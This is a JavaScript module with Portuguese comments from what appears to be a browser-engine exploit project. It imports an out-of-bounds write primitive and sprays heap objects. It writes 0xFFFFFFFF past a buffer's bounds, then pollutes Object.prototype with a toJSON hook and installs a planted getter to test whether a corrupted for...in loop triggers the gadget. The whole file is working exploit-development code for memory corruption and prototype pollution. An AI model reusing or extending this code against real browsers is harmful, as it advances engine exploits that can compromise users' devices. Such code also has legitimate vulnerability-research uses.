// js/script3/testForInGadget.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

const GADGET_PROPERTY_NAME = "AAAA_GdgT"; // Nome um pouco mais único para o getter
let gadget_getter_called_flag = false;
let last_gadget_this_id = null;
let last_gadget_this_marker_before = null;
let last_gadget_this_marker_after = null;


class MyComplexObject {
    constructor(id) {
        this.id = `MyObj-${id}`;
        this.value1 = 12345;
        this.value2 = "initial_state";
        this.marker = 0xCAFECAFE;
        this.anotherProperty = "clean"; // Propriedade para o getter tentar modificar
    }

    checkIntegrity(loggerFunc = logS3) { // Default to logS3 if no logger provided
        let checkOk = true;
        const currentId = this.id || "ID_DESCONHECIDO";
        if (this.marker !== 0xCAFECAFE && this.marker !== 0xBADF00D) { // Permitir o marcador modificado pelo gadget
            if(loggerFunc) loggerFunc(`!! ${currentId} - FALHA INTEGRIDADE! Marcador: ${toHex(this.marker)}`, 'critical', 'checkIntegrity');
            checkOk = false;
        }
        // Outras checagens podem ser adicionadas se necessário
        return checkOk;
    }
}

// Função toJSON que tentará acionar o getter via for...in
export function toJSON_TriggerForInGadget() {
    const FNAME_toJSON = "toJSON_TriggerForInGadget";
    logS3(`[${FNAME_toJSON}] Chamada. this.id (se MyComplexObject): ${this && typeof this.id !== 'undefined' ? this.id : 'N/A ou não MyComplexObject'}`, "info", FNAME_toJSON);
    let props_iterated_log = "";
    let iteration_count = 0;
    const max_iterations_for_log = 30;

    try {
        for (const prop in this) {
            iteration_count++;
            if (iteration_count <= max_iterations_for_log) {
                props_iterated_log += `${prop};`;
            } else if (iteration_count === max_iterations_for_log + 1) {
                props_iterated_log += `... (mais ${prop})`; // Loga a proxima propriedade
            }

            // A verificação se o gadget foi chamado é feita externamente pela flag
            // Apenas uma operação simples para tentar manter o loop estável, se possível
            if (typeof this[prop] === 'function') {
                // Evitar chamar funções aleatórias aqui para não introduzir instabilidade
            }


            if (iteration_count > 7000) { // Safety break aumentado
                logS3(`[${FNAME_toJSON}] Loop for...in excedeu 7000 iterações para this.id=${this.id}. Interrompendo.`, "warn", FNAME_toJSON);
                break;
            }
        }
        logS3(`[${FNAME_toJSON}] Loop for...in completou ${iteration_count} iterações para this.id=${this.id}. Props iniciais: ${props_iterated_log}`, "info", FNAME_toJSON);
        return {
            toJSON_executed: FNAME_toJSON,
            id: (this && typeof this.id !== 'undefined' ? this.id : 'N/A'),
            iterations: iteration_count,
            initial_props_iterated: props_iterated_log.substring(0, 200) // Limita o tamanho do log
        };
    } catch (e) {
        logS3(`[${FNAME_toJSON}] ERRO dentro do loop for...in para this.id=${this.id}: ${e.name} - ${e.message}`, "error", FNAME_toJSON);
        return {
            toJSON_executed: FNAME_toJSON,
            id: (this && typeof this.id !== 'undefined' ? this.id : 'N/A'),
            error: `${e.name}: ${e.message}`,
            iterations: iteration_count,
            initial_props_iterated: props_iterated_log.substring(0, 200)
        };
    }
}


export async function executeForInGadgetTest() {
    const FNAME_TEST = "executeForInGadgetTest";
    logS3(`--- Iniciando Teste: Tentativa de Acionar Getter via for...in Corrompido ---`, "test", FNAME_TEST);
    document.title = `Test ForIn Gadget`;

    gadget_getter_called_flag = false; // Resetar a flag global
    last_gadget_this_id = null;
    last_gadget_this_marker_before = null;
    last_gadget_this_marker_after = null;

    let originalGetterDescriptor = Object.getOwnPropertyDescriptor(MyComplexObject.prototype, GADGET_PROPERTY_NAME);
    let getterPollutionApplied = false;

    try {
        logS3(`Definindo getter '${GADGET_PROPERTY_NAME}' em MyComplexObject.prototype...`, 'info', FNAME_TEST);
        Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, {
            get: function() {
                logS3(`!!!! GADGET GETTER '${GADGET_PROPERTY_NAME}' CHAMADO !!!! this.id: ${this.id}`, "vuln", "EvilGetter");
                gadget_getter_called_flag = true;
                last_gadget_this_id = this.id;
                try {
                    last_gadget_this_marker_before = this.marker;
                    this.marker = 0xBADF00D; // Tenta modificar uma propriedade
                    last_gadget_this_marker_after = this.marker;
                    logS3(`   Dentro do getter, this.marker alterado de ${toHex(last_gadget_this_marker_before)} para ${toHex(last_gadget_this_marker_after)}`, "info", "EvilGetter");
                } catch (e_getter_mod) {
                    logS3(`   ERRO ao modificar this.marker dentro do getter: ${e_getter_mod.message}`, "error", "EvilGetter");
                }
                return "evil_value_returned_from_getter";
            },
            configurable: true,
            enumerable: true // Importante para que for...in possa encontrá-lo
        });
        getterPollutionApplied = true;
        logS3("Getter definido.", "good", FNAME_TEST);

    } catch (e_getter_setup) {
        logS3(`ERRO ao definir o getter em MyComplexObject.prototype: ${e_getter_setup.message}`, "error", FNAME_TEST);
        return; // Não podemos prosseguir sem o getter
    }


    const spray_count = 50;
    const sprayed_objects = [];
    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF; // Valor que causou instabilidade antes
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObject...`, "info", FNAME_TEST);
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_objects.push(new MyComplexObject(i));
        }
        logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
    } catch (e_spray) {
        logS3(`ERRO durante a pulverização: ${e_spray.message}. Abortando.`, "error", FNAME_TEST);
        if (getterPollutionApplied) delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        return;
    }

    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`2. Configurando ambiente OOB e realizando escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        if (getterPollutionApplied) delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        return;
    }

    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}] realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando sondagem.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        if (getterPollutionApplied) delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        return;
    }

    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`3. Sondando ${sprayed_objects.length} objetos complexos com toJSON_TriggerForInGadget...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONProtoDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let problem_detected = false;

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_TriggerForInGadget,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;

        const objectsToProbe = Math.min(sprayed_objects.length, 10);
        logS3(`   Sondando os primeiros ${objectsToProbe} objetos...`, 'info', FNAME_TEST);

        for (let i = 0; i < objectsToProbe; i++) {
            const obj = sprayed_objects[i];
            if (!obj) continue;

            gadget_getter_called_flag = false; // Reseta para cada objeto
            last_gadget_this_id = null;
            last_gadget_this_marker_before = null;
            last_gadget_this_marker_after = null;

            document.title = `Sondando Obj ${i} com ForInGadgetToJSON`;
            let stringifyResult = null;
            let errorDuringStringify = null;

            logS3(`   Testando objeto ${i} (ID: ${obj.id})...`, 'info', FNAME_TEST);
            try {
                stringifyResult = JSON.stringify(obj);
                logS3(`     JSON.stringify(obj[${i}]) completou. Resultado da toJSON: ${JSON.stringify(stringifyResult)}`, "info", FNAME_TEST);

                if (stringifyResult && stringifyResult.error) { // Erro DENTRO da toJSON_TriggerForInGadget
                    errorDuringStringify = new Error(`Erro interno da toJSON: ${stringifyResult.error}`);
                }
            } catch (e_str) { // Erro DO JSON.stringify (ex: RangeError)
                errorDuringStringify = e_str;
                logS3(`     !!!! ERRO AO STRINGIFY obj[${i}] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            }

            if (gadget_getter_called_flag) {
                logS3(`   !!!! SUCESSO: Gadget Getter '${GADGET_PROPERTY_NAME}' FOI CHAMADO para obj.id=${last_gadget_this_id} !!!!`, "vuln", FNAME_TEST);
                logS3(`        Detalhes do Getter: Marker antes=${toHex(last_gadget_this_marker_before)}, Marker depois=${toHex(last_gadget_this_marker_after)}`, "info", FNAME_TEST);
                if (obj.marker === 0xBADF00D) {
                    logS3(`        CONFIRMADO: Objeto sprayed_objects[${i}] (ID: ${obj.id}) teve seu 'marker' modificado pelo getter!`, "critical", FNAME_TEST);
                }
                problem_detected = true; // Sucesso é um "problema" desejável
                document.title = `SUCCESS: ForIn Gadget Called on ${obj.id}!`;
                break;
            }

            if (errorDuringStringify) {
                logS3(`   ERRO durante sondagem de obj[${i}]: ${errorDuringStringify.name} - ${errorDuringStringify.message}`, "error", FNAME_TEST);
                problem_detected = true;
                document.title = `ERROR ${errorDuringStringify.name} on ${obj.id}`;
                if (errorDuringStringify.name === 'RangeError') {
                    logS3("       RangeError ocorreu. O loop for...in ainda é instável.", "warn", FNAME_TEST);
                }
                break;
            }
             await PAUSE_S3(SHORT_PAUSE_S3);
        }
    } catch (e_main_loop) {
        logS3(`Erro no loop principal de sondagem: ${e_main_loop.message}`, "error", FNAME_TEST);
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (gadget_getter_called_flag) {
        logS3("Teste CONCLUÍDO: O Gadget Getter FOI ACIONADO!", "vuln", FNAME_TEST);
    } else if (problem_detected) {
        logS3("Teste CONCLUÍDO: Um problema (erro) ocorreu durante a sondagem.", "warn", FNAME_TEST);
    } else {
        logS3("Teste CONCLUÍDO: Nenhum gadget getter acionado ou erro óbvio nos objetos sondados.", "good", FNAME_TEST);
    }

    // Limpeza do getter no protótipo de MyComplexObject
    if (getterPollutionApplied) {
        if (originalGetterDescriptor) {
            Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
        } else {
            delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        }
        logS3(`Getter '${GADGET_PROPERTY_NAME}' restaurado/removido de MyComplexObject.prototype.`, "info", FNAME_TEST);
    }

    logS3(`--- Teste Tentativa de Acionar Getter via for...in CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_objects.length = 0;
    globalThis.gc?.();
    document.title = gadget_getter_called_flag ? document.title : (problem_detected ? document.title : `ForIn Gadget Test Done`);
}
